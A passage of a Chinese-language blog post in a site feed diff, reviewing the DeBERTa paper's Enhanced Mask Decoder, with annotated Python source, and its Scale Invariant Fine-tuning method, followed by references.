+刚看到这幅图可能有点晕，（a）代表的就是原始 BERT 的 MLM 的结构，可以看到从 BERT 的最后一层 Transformer encoder layer 出来的向量直接输入至 MLM 的解码器；而（b）表示的就是论文修改后的 EMD，其中 I 可以代表多种信息：1.绝对位置信息；2.绝对位置信息+隐层向量；3.隐层向量（前一层的输出）。$x_n$ 代表单元循环 n 次，所以当 n = 1，I = H 时，EMD 其实就和 BERT 的解码器是一样的。并且作者提到，在 DeBERTa 中，他们将 n 设置为了 2，并且 n 个单元的参数是共享的。
+</p>
+
+<p style="text-indent:2em">
+但到这里我还是很疑惑的，那作为预训练模型的那一些 Transformer encoder layer 有多少层呢？加上这个 EMD，不会造成参数量的增长吗？这些问题在论文开源的代码中我找到了答案。
+</p>
+
+<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">emd_context_layer</span><span class="hljs-params">(self, encoder_layers, z_states, attention_mask, encoder, target_ids, input_ids, input_mask, relative_pos=None)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> attention_mask.dim()&lt;=<span class="hljs-number">2</span>:</span><br><span class="line">        extended_attention_mask = attention_mask.unsqueeze(<span class="hljs-number">1</span>).unsqueeze(<span class="hljs-number">2</span>)</span><br><span class="line">        att_mask = extended_attention_mask.byte()</span><br><span class="line">        attention_mask = att_mask*att_mask.squeeze(<span class="hljs-number">-2</span>).unsqueeze(<span class="hljs-number">-1</span>)</span><br><span class="line">    <span class="hljs-keyword">elif</span> attention_mask.dim()==<span class="hljs-number">3</span>:</span><br><span class="line">        attention_mask = attention_mask.unsqueeze(<span class="hljs-number">1</span>)</span><br><span class="line">    target_mask = target_ids&gt;<span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-comment"># 取 deberta 的倒数第二层的隐层输出向量</span></span><br><span class="line">    hidden_states = encoder_layers[<span class="hljs-number">-2</span>]</span><br><span class="line">    <span class="hljs-comment"># 从这里开始 EMD 的计算</span></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.position_biased_input: </span><br><span class="line">        <span class="hljs-comment"># EMD 的 transformer encoder layer 有两个 \</span></span><br><span class="line">        <span class="hljs-comment"># 但都是用的 deberta 的最后一层的 encoder layer，因此论文中说参数共享</span></span><br><span class="line">        layers = [encoder.layer[<span class="hljs-number">-1</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]</span><br><span class="line">        <span class="hljs-comment"># `z_status`最开始传入进来的是绝对位置信息，现在加上上一层的输出</span></span><br><span class="line">        z_states +=  hidden_states</span><br><span class="line">        query_states = z_states</span><br><span class="line">        query_mask = attention_mask</span><br><span class="line">        outputs = []</span><br><span class="line">        rel_embeddings = encoder.get_rel_embedding()</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment"># 注意只有 EMD 的第一层 layer 才传入了绝对位置信息 \</span></span><br><span class="line">        <span class="hljs-comment"># 第二层的 layer 传入的是上一层的输出</span></span><br><span class="line">        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> layers:</span><br><span class="line">            <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> pass relative pos ids</span></span><br><span class="line">            output = layer(hidden_states, query_mask, return_att=<span class="hljs-literal">False</span>, query_states = query_states, relative_pos=relative_pos, rel_embeddings = rel_embeddings)</span><br><span class="line">            query_states = output</span><br><span class="line">            outputs.append(query_states)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        outputs = [encoder_layers[<span class="hljs-number">-1</span>]]</span><br><span class="line">    </span><br><span class="line">    _mask_index = (target_ids&gt;<span class="hljs-number">0</span>).view(<span class="hljs-number">-1</span>).nonzero().view(<span class="hljs-number">-1</span>)</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flatten_states</span><span class="hljs-params">(q_states)</span>:</span></span><br><span class="line">        q_states = q_states.view((<span class="hljs-number">-1</span>, q_states.size(<span class="hljs-number">-1</span>)))</span><br><span class="line">        q_states = q_states.index_select(<span class="hljs-number">0</span>, _mask_index)</span><br><span class="line">        <span class="hljs-keyword">return</span> q_states</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> [flatten_states(q) <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> outputs]</span><br></pre></td></tr></table></figure></p>
+<p style="text-indent:2em">
+根据源码，我们可以大致推断出，对标一个具有 12 层 Transformer encoder layer 的 BERT，DeBERTa 的 Transformer encoder layer 有 11 层，但有额外的 1 层 用于 EMD，并且复用这 1 层一次，相当于循环两次该层，最后整个 DeBERTa 的参数量其实还是 12 层，参数规模与 BERT 一致，不得不说确实巧妙。其他关于 EMD 的输入 I 的问题均在代码中以中文注释标注出来了。
+</p>
+
+<h3 id="四、Scale-Invariant-Fine-tuning"><a href="#四、Scale-Invariant-Fine-tuning" class="headerlink" title="四、Scale Invariant Fine-tuning"></a>四、Scale Invariant Fine-tuning</h3><p style="text-indent:2em">
+这部分主要介绍了一种用于 Fine-tuning 阶段的训练技巧，借鉴于虚拟对抗训练算法（virtual adversarial training algorithm），论文提出了一种规模不变微调（Scale Invariant Fine-tuning，SiFT）。虚拟对抗训练是一种提高模型泛化能力的正则化方法，它通过提高模型对对抗性示例的鲁棒性来实现，对抗性示例是通过对输入进行小幅扰动而创建的。
+</p>
+<p style="text-indent:2em">
+作者指出，对于 NLP 任务，扰动应用于词嵌入而不是原始词序列。然而，嵌入向量的取值范围（范数）在不同的词和模型之间有所不同。对于具有数十亿个参数的更大模型，方差会变得更大，从而导致对抗性训练的一些不稳定性。而对于 SiFT 的对于 VAT 的改进就一句话描述：“applying the perturbations to the normalized word embeddings”，也就是说在经过标准化后的 word embedding 上添加随机扰动，从而就可以限定扰动的”方差“的值的范围不会太大，也不会太小<sup>[3]</sup>。
+</p>
+
+<p style="text-indent:2em">
+但 SiFT 算法只应用到了 DeBERTa1.5B 这个模型上面，我们直接看结果。
+</p>
+
+<p><img src="/2021/11/24/deberta/SiFT_results.png" alt="SiFT_results"><br>可以看到，在 DeBERTa1.5B 上加入 SiFT 后，性能有了进一步的提升。</p>
+<h3 id="五、实验结果"><a href="#五、实验结果" class="headerlink" title="五、实验结果"></a>五、实验结果</h3><p>这部分的消融实验做的挺充分的，累了，就不贴图了，大伙自己去原文看吧…</p>
+<h3 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h3><p>[1] Shaw P, Uszkoreit J, Vaswani A. Self-Attention with Relative Position Representations[C]//Proceedings of the 2018 Conference of the North American Chapter of the Association for Computational Linguistics: Human Language Technologies, Volume 2 (Short Papers). 2018: 464-468.<br>[2] Vaswani A, Shazeer N, Parmar N, et al. Attention is all you need[C]//Advances in neural information processing systems. 2017: 5998-6008.<br>[3] <a href="https://zhuanlan.zhihu.com/p/395086745" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/395086745</a></p>
+<style>
+    img {
+        width: 55%;
+        height: 55%;
+        margin: auto;
+        display: table-cell;
+        text-align: center;
+    }
+</style>
+]]></content>
+      <categories>
+        <category>Paper Reading</category>
       </categories>
   </entry>
   <entry>
